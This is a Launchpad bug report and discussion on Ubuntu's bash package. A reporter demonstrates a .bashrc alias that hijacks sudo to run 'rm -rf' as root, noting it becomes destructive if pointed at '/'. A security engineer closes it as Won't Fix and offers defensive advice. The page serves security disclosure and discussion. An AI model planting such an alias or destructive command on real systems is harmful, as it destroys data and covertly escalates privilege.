@@ -1,0 +1,168 @@
+Launchpad Bug: 1893241
+URL: https://bugs.launchpad.net/ubuntu/+source/bash/+bug/1893241
+
+Bug #1893241 “attack alias sudo with nasty payload” : Bugs : bash package : Ubuntu
+Log in / Register
+Ubuntu
+bash package
+Overview
+Code
+Bugs
+Blueprints
+Translations
+Answers
+attack alias sudo with nasty payload
+Bug #1893241 reported by
+Patrik Nilsson
+on 2020-08-27
+258
+This bug affects 1 person
+Affects
+Status
+Importance
+Assigned to
+Milestone
+bash (Ubuntu)
+Won't Fix
+Undecided
+Unassigned
+Bug Description
+Put the alias below in ~/.bashrc, which is writable by the current user and wait for the user to open up a shell and become root.
+There are numerous of possibilities. If you exchange "/tmp/aBSoLuTLY
+NoTHiNG" to "/" it becomes dangerous. Or imagine an attacker that can't become a root in any other way and wants to setup a botnet.
+$ alias sudo='function f() { sudo -- rm -rf  "/tmp/aBSoLuTLY
+NoTHiNG" ; sudo touch "/tmp/aBSoLuTLY
+NoTHiNG" ; echo "Everything removed!!" ;  sudo "$@" ; } ; f "$@"'
+$ stat /tmp/aBSoLuTLYN
+oTHiNG
+stat: cannot stat '/tmp/aBSoLuTLY
+NoTHiNG'
+: No such file or directory
+$ sudo echo 'hello wonderful world!'
+Everything removed!!
+hello wonderful world!
+$ stat /tmp/aBSoLuTLYN
+oTHiNG
+File: /tmp/aBSoLuTLYN
+oTHiNG
+Size: 0         	Blocks: 0          IO Block: 4096   regular empty file
+Device: fd00h/64768d	Inode: 4718664     Links: 1
+Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2020-08-27 18:09:50.960080579 +0200
+Modify: 2020-08-27 18:09:50.960080579 +0200
+Change: 2020-08-27 18:09:50.960080579 +0200
+Birth: -
+File written by root! Fastest fix: Sudo is not allowed to be an alias.
+Extra information:
+$ lsb_release -rd
+Description:	Ubuntu 20.04.1 LTS
+Release:	20.04
+Seth Arnold (seth-arnold)
+on 2020-08-28
+information type
+:
+Private Security → Public Security
+Changed in bash (Ubuntu):
+status
+:
+New → Won't Fix
+Revision history for this message
+Seth Arnold (seth-arnold)
+wrote
+on 2020-08-28
+:
+#1
+Hello Patrik, thanks for your concern for Ubuntu's security.
+As you said, there are numerous possibilities for trouble when an account is compromised in this fashion. Placing malicious versions of utilities into ~/bin is another common choice. (Usually shell aliases, functions, and ~/bin/ replacements of common utilities is in the realm of "students playing practical jokes on each other when they first use Unix systems".)
+Consider a slight modification of your function, to call it 'ls' or 'mv' or 'cat'. Would it be any less dangerous? If the user used sudo in that terminal recently, it's bad news. If the user didn't authenticate to sudo recently they will be prompted for a password, they may wonder why, and start to investigate. How? With 'vi'? With 'cat'? With 'alias'? Each of those could also do other malicious things.
+A more enterprising attacker with the ability to modify user files could install a keylogger, or cause shell sessions to start with script(1) or similar utilities, or use ptrace-based debugging techniques to read secrets from user processes, etc. These would be more reliable and harder to spot.
+On Ubuntu, it is a convention that the first user account on the computer gets sudo access; while this is very convenient, it's also a risk. It is also common for higher-security environments for one person to have multiple accounts: one used for administrative actions and one used for their personal work on the computer.
+It is also important to recall that root access is not necessarily the most important goal of an attacker. Computers work with a wide variety of data from a wide variety of sources and threats like cryptolockers or data exfiltration often doesn't need root privileges to be catastrophically bad for a user or an organization.
+There's no simple solution to address what you've found. It used to be common for system administrators to run periodic checks of all user files to make sure permissions made sense, there was nothing malicious in them, etc. (This was my introduction to Unix security in the 90s; an ircii plugin I had downloaded added '+ +' to my ~/.rhosts file. It was spotted by the sysadmin a few hours later thanks to an automated tool.)
+In addition to checking for too-wide write permissions, also be sure to protect your account with good, high-quality, passwords, and disable password authentication where you can, so you can rely upon ssh authorized_keys instead. Lock your screen before suspending your laptop or walking away from your desktop. Be careful with what USB and Firewire devices you plug into your computer. And so on.
+We can't realistically try to handle "someone has write access to my home directory" as a threat model. If someone has write access to your home directory they can do a great deal of damage.
+Thanks
+Hello Patrik, thanks for your concern for Ubuntu's security.
+
+As you said, there are numerous possibilities for trouble when an account is compromised in this fashion. Placing malicious versions of utilities into ~/bin is another common choice. (Usually shell aliases, functions, and ~/bin/ replacements of common utilities is in the realm of "students playing practical jokes on each other when they first use Unix systems".)
+
+Consider a slight modification of your function, to call it 'ls' or 'mv' or 'cat'. Would it be any less dangerous? If the user used sudo in that terminal recently, it's bad news. If the user didn't authenticate to sudo recently they will be prompted for a password, they may wonder why, and start to investigate. How? With 'vi'? With 'cat'? With 'alias'? Each of those could also do other malicious things.
+
+A more enterprising attacker with the ability to modify user files could install a keylogger, or cause shell sessions to start with script(1) or similar utilities, or use ptrace-based debugging techniques to read secrets from user processes, etc. These would be more reliable and harder to spot.
+
+On Ubuntu, it is a convention that the first user account on the computer gets sudo access; while this is very convenient, it's also a risk. It is also common for higher-security environments for one person to have multiple accounts: one used for administrative actions and one used for their personal work on the computer.
+
+It is also important to recall that root access is not necessarily the most important goal of an attacker. Computers work with a wide variety of data from a wide variety of sources and threats like cryptolockers or data exfiltration often doesn't need root privileges to be catastrophically bad for a user or an organization.
+
+There's no simple solution to address what you've found. It used to be common for system administrators to run periodic checks of all user files to make sure permissions made sense, there was nothing malicious in them, etc. (This was my introduction to Unix security in the 90s; an ircii plugin I had downloaded added '+ +' to my ~/.rhosts file. It was spotted by the sysadmin a few hours later thanks to an automated tool.)
+
+In addition to checking for too-wide write permissions, also be sure to protect your account with good, high-quality, passwords, and disable password authentication where you can, so you can rely upon ssh authorized_keys instead. Lock your screen before suspending your laptop or walking away from your desktop. Be careful with what USB and Firewire devices you plug into your computer. And so on.
+
+We can't realistically try to handle "someone has write access to my home directory" as a threat model. If someone has write access to your home directory they can do a great deal of damage.
+
+Thanks
+Revision history for this message
+Patrik Nilsson (nipatriknilsson)
+wrote
+on 2020-08-29
+:
+#2
+@seth-arnold
+I agree with you that there are other things to address as well.
+In the art of hacking you most probably get into a system via some kind of service. You maybe have the privileges of a daemon. You then get an access to the first user account. You want to escalate privilege and you search to find weaknesses. As a system owner you want as many layers of protection as possible.
+It is a weakness that the PATH-variable can be set without given your password, since an attacker can set their evil command before the one you expect in the execution priority.
+The same comes to the ALIAS-command. As demonstrated, they can help compromise your system.
+So you are right there were more things to think about, but we all want a system as safe as possible.
+@seth-arnold
+
+I agree with you that there are other things to address as well.
+
+In the art of hacking you most probably get into a system via some kind of service. You maybe have the privileges of a daemon. You then get an access to the first user account. You want to escalate privilege and you search to find weaknesses. As a system owner you want as many layers of protection as possible.
+
+It is a weakness that the PATH-variable can be set without given your password, since an attacker can set their evil command before the one you expect in the execution priority.
+
+The same comes to the ALIAS-command. As demonstrated, they can help compromise your system.
+
+So you are right there were more things to think about, but we all want a system as safe as possible.
+See full activity log
+To post a comment you must
+log in
+.
+Report a bug
+This report contains
+Public Security
+information
+Everyone can see this security related information.
+You are
+not directly subscribed to this bug's notifications.
+Subscribing...
+Edit bug mail
+Other bug subscribers
+Subscribe someone else
+Remote bug watches
+Bug watches keep track of this bug in other bug trackers.
+•
+Take the tour
+•
+Read the guide
+© 2004
+Canonical Ltd.
+•
+Terms of use
+•
+Data privacy
+•
+Contact Launchpad Support
+•
+Blog
+•
+Careers
+•
+System status
+• 
+        18a29c9
+        
+        
+        (
+Get the code!
+)
